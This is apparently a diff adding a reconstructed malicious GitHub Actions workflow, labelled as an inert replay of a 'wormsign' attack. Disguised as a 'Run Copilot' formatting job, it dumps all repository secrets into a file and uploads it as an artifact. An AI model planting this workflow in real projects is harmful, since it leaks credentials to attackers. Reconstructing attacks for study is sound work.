@@ -1,0 +1,19 @@
+# wormsign replay: inert reconstruction, not a sample. The trigger, the variable name and the write command are not
+# published; see README.md for which lines are placeholders.
+name: Run Copilot
+on: push
+jobs:
+  format:
+    runs-on: ubuntu-latest
+    env:
+      DATA: ${{ toJSON(secrets) }}
+    steps:
+      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
+      - run: |
+          cat <<EOF > format-results.txt
+          $DATA
+          EOF
+      - uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f
+        with:
+          name: format-results
+          path: format-results.txt
